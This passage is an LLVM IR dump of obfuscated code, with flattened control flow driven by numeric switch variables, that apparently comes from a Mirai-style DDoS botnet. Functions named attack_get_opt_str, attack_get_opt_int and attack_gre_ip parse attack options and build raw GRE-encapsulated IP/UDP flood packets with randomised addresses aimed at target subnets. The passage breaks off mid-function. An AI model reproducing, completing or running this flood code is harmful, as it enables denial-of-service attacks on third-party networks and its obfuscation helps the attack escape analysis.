  ret void

loopEnd:                                          ; preds = %36, %33, %32, %25, %16, %11, %10, %9, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #4

; Function Attrs: noinline nounwind uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option*, i8 zeroext, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  %switchVar = alloca i32
  store i32 -688742568, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -688742568, label %11
    i32 308885706, label %17
    i32 438720787, label %29
    i32 -1074974489, label %36
    i32 1914852907, label %37
    i32 -70638951, label %40
    i32 1387835281, label %42
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %10, align 4
  %13 = load i8, i8* %6, align 1
  %14 = zext i8 %13 to i32
  %15 = icmp slt i32 %12, %14
  %16 = select i1 %15, i32 308885706, i32 -70638951
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %19 = load i32, i32* %10, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %18, i64 %20
  %22 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %21, i32 0, i32 1
  %23 = load i8, i8* %22, align 8
  %24 = zext i8 %23 to i32
  %25 = load i8, i8* %8, align 1
  %26 = zext i8 %25 to i32
  %27 = icmp eq i32 %24, %26
  %28 = select i1 %27, i32 438720787, i32 -1074974489
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %31 = load i32, i32* %10, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %30, i64 %32
  %34 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %33, i32 0, i32 0
  %35 = load i8*, i8** %34, align 8
  store i8* %35, i8** %5, align 8
  store i32 1387835281, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  store i32 1914852907, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %10, align 4
  %39 = add nsw i32 %38, 1
  store i32 %39, i32* %10, align 4
  store i32 -688742568, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %9, align 8
  store i8* %41, i8** %5, align 8
  store i32 1387835281, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i8*, i8** %5, align 8
  ret i8* %43

loopEnd:                                          ; preds = %40, %37, %36, %29, %17, %11, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %.reg2mem = alloca i8*
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  store i8* %15, i8** %.reg2mem
  %switchVar = alloca i32
  store i32 -1005984774, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1005984774, label %first
    i32 1247416316, label %18
    i32 1501310021, label %20
    i32 1631304019, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8*, i8** %.reg2mem
  %16 = icmp eq i8* %.reload, null
  %17 = select i1 %16, i32 1247416316, i32 1501310021
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* %9, align 4
  store i32 %19, i32* %5, align 4
  store i32 1631304019, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i8*, i8** %10, align 8
  %22 = call i32 @util_atoi(i8* %21, i32 10)
  store i32 %22, i32* %5, align 4
  store i32 1631304019, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %5, align 4
  ret i32 %24

loopEnd:                                          ; preds = %20, %18, %first, %switchDefault
  br label %loopEntry
}

declare i32 @util_atoi(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %.reg2mem = alloca i8*
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  store i8* %15, i8** %.reg2mem
  %switchVar = alloca i32
  store i32 -2026266363, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -2026266363, label %first
    i32 403244024, label %18
    i32 -630570938, label %20
    i32 -1187574369, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8*, i8** %.reg2mem
  %16 = icmp eq i8* %.reload, null
  %17 = select i1 %16, i32 403244024, i32 -630570938
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* %9, align 4
  store i32 %19, i32* %5, align 4
  store i32 -1187574369, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i8*, i8** %10, align 8
  %22 = call i32 @inet_addr(i8* %21) #6
  store i32 %22, i32* %5, align 4
  store i32 -1187574369, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %5, align 4
  ret i32 %24

loopEnd:                                          ; preds = %20, %18, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_ip(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.grehdr*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca %struct.iphdr*, align 8
  %31 = alloca %struct.grehdr*, align 8
  %32 = alloca %struct.iphdr*, align 8
  %33 = alloca %struct.udphdr*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %36 = load i8, i8* %7, align 1
  %37 = zext i8 %36 to i64
  %38 = call noalias i8* @calloc(i64 %37, i64 8) #6
  %39 = bitcast i8* %38 to i8**
  store i8** %39, i8*** %13, align 8
  %40 = load i8, i8* %9, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 2, i32 0)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %14, align 1
  %44 = load i8, i8* %9, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 3, i32 65535)
  %47 = trunc i32 %46 to i16
  store i16 %47, i16* %15, align 2
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 4, i32 64)
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %16, align 1
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 5, i32 1)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %17, align 1
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 6, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %18, align 2
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 7, i32 65535)
  %63 = trunc i32 %62 to i16
  store i16 %63, i16* %19, align 2
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 0, i32 512)
  store i32 %66, i32* %20, align 4
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %69 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 1, i32 1)
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %21, align 1
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 18, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %22, align 1
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = load i32, i32* @LOCAL_ADDR, align 4
  %78 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 19, i32 %77)
  store i32 %78, i32* %23, align 4
  %79 = call i64 @time(i64* null) #6
  %80 = load i32, i32* %6, align 4
  %81 = sext i32 %80 to i64
  %82 = add nsw i64 %79, %81
  %83 = trunc i64 %82 to i32
  store i32 %83, i32* %24, align 4
  %84 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %84, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %12, align 4
  %switchVar = alloca i32
  store i32 -814514066, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %5
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -814514066, label %first
    i32 99774253, label %87
    i32 -301284013, label %88
    i32 -83512336, label %94
    i32 -1696853782, label %97
    i32 1526019191, label %98
    i32 -6537635, label %104
    i32 317734578, label %155
    i32 -765715721, label %159
    i32 1007301516, label %209
    i32 454771223, label %213
    i32 -2133744933, label %222
    i32 -962689093, label %228
    i32 475506107, label %236
    i32 -7670428, label %252
    i32 1933366815, label %255
    i32 -857168966, label %256
    i32 -123116853, label %257
    i32 1090658744, label %263
    i32 -332250748, label %292
    i32 -380617725, label %313
    i32 -1301117234, label %317
    i32 1117198272, label %321
    i32 1826047425, label %326
    i32 -1584735889, label %341
    i32 830193557, label %346
    i32 -359924265, label %352
    i32 -938061285, label %357
    i32 1041029209, label %363
    i32 -1398351799, label %367
    i32 1808474965, label %371
    i32 -1163621198, label %377
    i32 -1957271981, label %381
    i32 -1107118081, label %388
    i32 -2108823308, label %455
    i32 -903335405, label %458
    i32 -803274406, label %464
    i32 -1803405990, label %465
    i32 1807705345, label %466
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %85 = icmp eq i32 %.reload, -1
  %86 = select i1 %85, i32 99774253, i32 -301284013
  store i32 %86, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  store i32 1807705345, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  store i32 1, i32* %11, align 4
  %89 = load i32, i32* %12, align 4
  %90 = bitcast i32* %11 to i8*
  %91 = call i32 @setsockopt(i32 %89, i32 0, i32 3, i8* %90, i32 4) #6
  %92 = icmp eq i32 %91, -1
  %93 = select i1 %92, i32 -83512336, i32 -1696853782
  store i32 %93, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i32, i32* %12, align 4
  %96 = call i32 @close(i32 %95)
  store i32 1807705345, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 1526019191, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  %99 = load i32, i32* %11, align 4
  %100 = load i8, i8* %7, align 1
  %101 = zext i8 %100 to i32
  %102 = icmp slt i32 %99, %101
  %103 = select i1 %102, i32 -6537635, i32 1933366815
  store i32 %103, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  %105 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %106 = load i8**, i8*** %13, align 8
  %107 = load i32, i32* %11, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds i8*, i8** %106, i64 %108
  store i8* %105, i8** %109, align 8
  %110 = load i8**, i8*** %13, align 8
  %111 = load i32, i32* %11, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds i8*, i8** %110, i64 %112
  %114 = load i8*, i8** %113, align 8
  %115 = bitcast i8* %114 to %struct.iphdr*
  store %struct.iphdr* %115, %struct.iphdr** %25, align 8
  %116 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %117 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %116, i64 1
  %118 = bitcast %struct.iphdr* %117 to %struct.grehdr*
  store %struct.grehdr* %118, %struct.grehdr** %26, align 8
  %119 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %120 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %119, i64 1
  %121 = bitcast %struct.grehdr* %120 to %struct.iphdr*
  store %struct.iphdr* %121, %struct.iphdr** %27, align 8
  %122 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %123 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %122, i64 1
  %124 = bitcast %struct.iphdr* %123 to %struct.udphdr*
  store %struct.udphdr* %124, %struct.udphdr** %28, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %126 = bitcast %struct.iphdr* %125 to i8*
  %127 = load i8, i8* %126, align 4
  %128 = and i8 %127, 15
  %129 = or i8 %128, 64
  store i8 %129, i8* %126, align 4
  %130 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %131 = bitcast %struct.iphdr* %130 to i8*
  %132 = load i8, i8* %131, align 4
  %133 = and i8 %132, -16
  %134 = or i8 %133, 5
  store i8 %134, i8* %131, align 4
  %135 = load i8, i8* %14, align 1
  %136 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %137 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %136, i32 0, i32 1
  store i8 %135, i8* %137, align 1
  %138 = load i32, i32* %20, align 4
  %139 = sext i32 %138 to i64
  %140 = add i64 52, %139
  %141 = trunc i64 %140 to i16
  %142 = call zeroext i16 @htons(i16 zeroext %141) #7
  %143 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %144 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %143, i32 0, i32 2
  store i16 %142, i16* %144, align 2
  %145 = load i16, i16* %15, align 2
  %146 = call zeroext i16 @htons(i16 zeroext %145) #7
  %147 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %148 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %147, i32 0, i32 3
  store i16 %146, i16* %148, align 4
  %149 = load i8, i8* %16, align 1
  %150 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %151 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %150, i32 0, i32 5
  store i8 %149, i8* %151, align 4
  %152 = load i8, i8* %17, align 1
  %153 = icmp ne i8 %152, 0
  %154 = select i1 %153, i32 317734578, i32 -765715721
  store i32 %154, i32* %switchVar
  br label %loopEnd

; <label>:155:                                    ; preds = %loopEntry
  %156 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %157 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %158 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %157, i32 0, i32 4
  store i16 %156, i16* %158, align 2
  store i32 -765715721, i32* %switchVar
  br label %loopEnd

; <label>:159:                                    ; preds = %loopEntry
  %160 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %161 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %160, i32 0, i32 6
  store i8 47, i8* %161, align 1
  %162 = load i32, i32* %23, align 4
  %163 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %164 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %163, i32 0, i32 8
  store i32 %162, i32* %164, align 4
  %165 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %166 = load i32, i32* %11, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %165, i64 %167
  %169 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %168, i32 0, i32 1
  %170 = load i32, i32* %169, align 4
  %171 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %172 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %171, i32 0, i32 9
  store i32 %170, i32* %172, align 4
  %173 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %174 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %175 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %174, i32 0, i32 1
  store i16 %173, i16* %175, align 2
  %176 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %177 = bitcast %struct.iphdr* %176 to i8*
  %178 = load i8, i8* %177, align 4
  %179 = and i8 %178, 15
  %180 = or i8 %179, 64
  store i8 %180, i8* %177, align 4
  %181 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %182 = bitcast %struct.iphdr* %181 to i8*
  %183 = load i8, i8* %182, align 4
  %184 = and i8 %183, -16
  %185 = or i8 %184, 5
  store i8 %185, i8* %182, align 4
  %186 = load i8, i8* %14, align 1
  %187 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %188 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %187, i32 0, i32 1
  store i8 %186, i8* %188, align 1
  %189 = load i32, i32* %20, align 4
  %190 = sext i32 %189 to i64
  %191 = add i64 28, %190
  %192 = trunc i64 %191 to i16
  %193 = call zeroext i16 @htons(i16 zeroext %192) #7
  %194 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %195 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %194, i32 0, i32 2
  store i16 %193, i16* %195, align 2
  %196 = load i16, i16* %15, align 2
  %197 = zext i16 %196 to i32
  %198 = xor i32 %197, -1
  %199 = trunc i32 %198 to i16
  %200 = call zeroext i16 @htons(i16 zeroext %199) #7
  %201 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %202 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %201, i32 0, i32 3
  store i16 %200, i16* %202, align 4
  %203 = load i8, i8* %16, align 1
  %204 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %205 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %204, i32 0, i32 5
  store i8 %203, i8* %205, align 4
  %206 = load i8, i8* %17, align 1
  %207 = icmp ne i8 %206, 0
  %208 = select i1 %207, i32 1007301516, i32 454771223
  store i32 %208, i32* %switchVar
  br label %loopEnd

; <label>:209:                                    ; preds = %loopEntry
  %210 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %211 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %212 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %211, i32 0, i32 4
  store i16 %210, i16* %212, align 2
  store i32 454771223, i32* %switchVar
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  %214 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %215 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %214, i32 0, i32 6
  store i8 17, i8* %215, align 1
  %216 = call i32 @rand_next()
  %217 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %218 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %217, i32 0, i32 8
  store i32 %216, i32* %218, align 4
  %219 = load i8, i8* %22, align 1
  %220 = icmp ne i8 %219, 0
  %221 = select i1 %220, i32 -2133744933, i32 -962689093
  store i32 %221, i32* %switchVar
  br label %loopEnd

; <label>:222:                                    ; preds = %loopEntry
  %223 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %224 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %223, i32 0, i32 9
  %225 = load i32, i32* %224, align 4
  %226 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %227 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %226, i32 0, i32 9
  store i32 %225, i32* %227, align 4
  store i32 475506107, i32* %switchVar
  br label %loopEnd

; <label>:228:                                    ; preds = %loopEntry
  %229 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %230 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %229, i32 0, i32 8
  %231 = load i32, i32* %230, align 4
  %232 = sub i32 %231, 1024
  %233 = xor i32 %232, -1
  %234 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %235 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %234, i32 0, i32 9
  store i32 %233, i32* %235, align 4
  store i32 475506107, i32* %switchVar
  br label %loopEnd

; <label>:236:                                    ; preds = %loopEntry
  %237 = load i16, i16* %18, align 2
  %238 = call zeroext i16 @htons(i16 zeroext %237) #7
  %239 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %240 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %239, i32 0, i32 0
  store i16 %238, i16* %240, align 2
  %241 = load i16, i16* %19, align 2
  %242 = call zeroext i16 @htons(i16 zeroext %241) #7
  %243 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %244 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %243, i32 0, i32 1
  store i16 %242, i16* %244, align 2
  %245 = load i32, i32* %20, align 4
  %246 = sext i32 %245 to i64
  %247 = add i64 8, %246
  %248 = trunc i64 %247 to i16
  %249 = call zeroext i16 @htons(i16 zeroext %248) #7
  %250 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %251 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %250, i32 0, i32 2
  store i16 %249, i16* %251, align 2
  store i32 -7670428, i32* %switchVar
  br label %loopEnd

; <label>:252:                                    ; preds = %loopEntry
  %253 = load i32, i32* %11, align 4
  %254 = add nsw i32 %253, 1
  store i32 %254, i32* %11, align 4
  store i32 1526019191, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  store i32 -857168966, i32* %switchVar
  br label %loopEnd

; <label>:256:                                    ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 -123116853, i32* %switchVar
  br label %loopEnd

; <label>:257:                                    ; preds = %loopEntry
  %258 = load i32, i32* %11, align 4
  %259 = load i8, i8* %7, align 1
  %260 = zext i8 %259 to i32
  %261 = icmp slt i32 %258, %260
  %262 = select i1 %261, i32 1090658744, i32 -903335405
  store i32 %262, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %264 = load i8**, i8*** %13, align 8
  %265 = load i32, i32* %11, align 4
  %266 = sext i32 %265 to i64
  %267 = getelementptr inbounds i8*, i8** %264, i64 %266
  %268 = load i8*, i8** %267, align 8
  store i8* %268, i8** %29, align 8
  %269 = load i8*, i8** %29, align 8
  %270 = bitcast i8* %269 to %struct.iphdr*
  store %struct.iphdr* %270, %struct.iphdr** %30, align 8
  %271 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %272 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %271, i64 1
  %273 = bitcast %struct.iphdr* %272 to %struct.grehdr*
  store %struct.grehdr* %273, %struct.grehdr** %31, align 8
  %274 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %275 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %274, i64 1
  %276 = bitcast %struct.grehdr* %275 to %struct.iphdr*
  store %struct.iphdr* %276, %struct.iphdr** %32, align 8
  %277 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %278 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %277, i64 1
  %279 = bitcast %struct.iphdr* %278 to %struct.udphdr*
  store %struct.udphdr* %279, %struct.udphdr** %33, align 8
  %280 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %281 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %280, i64 1
  %282 = bitcast %struct.udphdr* %281 to i8*
  store i8* %282, i8** %34, align 8
  %283 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %284 = load i32, i32* %11, align 4
  %285 = sext i32 %284 to i64
  %286 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %283, i64 %285
  %287 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %286, i32 0, i32 2
  %288 = load i8, i8* %287, align 4
  %289 = zext i8 %288 to i32
  %290 = icmp slt i32 %289, 32
  %291 = select i1 %290, i32 -332250748, i32 -380617725
  store i32 %291, i32* %switchVar
  br label %loopEnd

; <label>:292:                                    ; preds = %loopEntry
  %293 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %294 = load i32, i32* %11, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %293, i64 %295
  %297 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %296, i32 0, i32 1
  %298 = load i32, i32* %297, align 4
  %299 = call i32 @ntohl(i32 %298) #7
  %300 = call i32 @rand_next()
  %301 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %302 = load i32, i32* %11, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %301, i64 %303
  %305 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %304, i32 0, i32 2
  %306 = load i8, i8* %305, align 4
  %307 = zext i8 %306 to i32
  %308 = lshr i32 %300, %307
  %309 = add i32 %299, %308
  %310 = call i32 @htonl(i32 %309) #7
  %311 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %312 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %311, i32 0, i32 9
  store i32 %310, i32* %312, align 4
  store i32 -380617725, i32* %switchVar
  br label %loopEnd

; <label>:313:                                    ; preds = %loopEntry
  %314 = load i32, i32* %23, align 4
  %315 = icmp eq i32 %314, -1
  %316 = select i1 %315, i32 -1301117234, i32 1117198272
  store i32 %316, i32* %switchVar
  br label %loopEnd

; <label>:317:                                    ; preds = %loopEntry
  %318 = call i32 @rand_next()
  %319 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %320 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %319, i32 0, i32 8
  store i32 %318, i32* %320, align 4
  store i32 1117198272, i32* %switchVar
  br label %loopEnd

; <label>:321:                                    ; preds = %loopEntry
  %322 = load i16, i16* %15, align 2
